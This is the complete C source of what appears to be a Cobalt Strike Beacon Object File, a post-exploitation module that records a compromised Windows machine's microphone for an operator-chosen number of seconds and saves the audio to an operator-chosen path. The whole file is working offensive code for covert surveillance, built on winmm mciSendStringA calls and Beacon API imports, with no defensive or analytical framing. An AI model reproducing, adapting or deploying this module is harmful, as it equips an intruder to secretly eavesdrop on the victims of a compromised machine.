#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <mmsystem.h>
#include "beacon.h"

#pragma comment(lib, "winmm.lib")
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI WINMM$mciSendStringA (CHAR*, CHAR*, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$GetSystemTime (SYSTEMTIME*);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$GetLocalTime (SYSTEMTIME*);
DECLSPEC_IMPORT WINBASEAPI INT WINAPI KERNEL32$FileTimeToSystemTime (FILETIME*, SYSTEMTIME*);
DECLSPEC_IMPORT WINBASEAPI INT WINAPI KERNEL32$SystemTimeToFileTime (SYSTEMTIME*, FILETIME*);
WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *str);
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
WINBASEAPI char WINAPI MSVCRT$strcat(char *destination, const char *source);


void sleep(int seconds)
{
	SYSTEMTIME st;
	FILETIME ft;

	KERNEL32$GetLocalTime(&st);
	KERNEL32$SystemTimeToFileTime(&st, &ft);

	((ULARGE_INTEGER *)&ft)->QuadPart +=(seconds*10000000LLU);

	KERNEL32$FileTimeToSystemTime(&ft,&st);

	
	int waiting = 1;
	SYSTEMTIME now;
	KERNEL32$GetLocalTime(&now);

	while(waiting) 
	{
		if (now.wDay == st.wDay && now.wMonth == st.wMonth && now.wYear == st.wYear && now.wHour == st.wHour && now.wMinute == st.wMinute && now.wSecond == st.wSecond)	
		{	
			waiting = 0;
		}
		KERNEL32$GetLocalTime(&now);
	}
	return;
}

void go(char *argv, int argc)
{
	datap parser;	
	BeaconDataParse(&parser, argv, argc);
		
	CHAR * filepath; 
	int recordtime;

	filepath = BeaconDataExtract(&parser, NULL);
	recordtime = BeaconDataInt(&parser);

	// mciSendString functions taken from https://gist.github.com/rliebig/2229694
	
	int mci_error;

	char mci_command_open[] = "open new type waveaudio alias audiorecordingbof";
	mci_error = WINMM$mciSendStringA(mci_command_open, NULL, 0, NULL);

	char mci_command_set[] = "set audiorecordingbof time format ms";
	mci_error = WINMM$mciSendStringA(mci_command_set, NULL, 0, NULL);

	// start recording
	char mci_command_record[] = "record audiorecordingbof notify";
	mci_error = WINMM$mciSendStringA(mci_command_record, NULL, 0, NULL);
	sleep(recordtime);

	//stop recording
	char mci_command_stop[] = "stop audiorecordingbof";
	mci_error = WINMM$mciSendStringA(mci_command_stop, NULL, 0, NULL);

	// save the file
	char _mci_command_save[] = "save audiorecordingbof ";
	char *mci_command_save = MSVCRT$malloc(MSVCRT$strlen(_mci_command_save) + MSVCRT$strlen(filepath) + 1);
	mci_command_save[0] = 's';
	mci_command_save[1] = 'a';
	mci_command_save[2] = 'v';
	mci_command_save[3] = 'e';
	mci_command_save[4] = ' ';
	mci_command_save[5] = 'a';
	mci_command_save[6] = 'u';
	mci_command_save[7] = 'd';
	mci_command_save[8] = 'i';
	mci_command_save[9] = 'o';
	mci_command_save[10] = 'r';
	mci_command_save[11] = 'e';
	mci_command_save[12] = 'c';
	mci_command_save[13] = 'o';
	mci_command_save[14] = 'r';
	mci_command_save[15] = 'd';
	mci_command_save[16] = 'i';
	mci_command_save[17] = 'n';
	mci_command_save[18] = 'g';
	mci_command_save[19] = 'b';
	mci_command_save[20] = 'o';
	mci_command_save[21] = 'f';
	mci_command_save[22] = ' ';
	mci_command_save[23] = '\0';
    	MSVCRT$strcat(mci_command_save, filepath);

	BeaconPrintf(CALLBACK_OUTPUT, "Saving file\n", mci_command_save);
	mci_error = WINMM$mciSendStringA(mci_command_save, NULL, 0, NULL);

	// close the device
	char mci_command_close[] = "close audiorecordingbof";
	mci_error = WINMM$mciSendStringA(mci_command_close, NULL, 0, NULL);
	sleep(2);

	return;
}
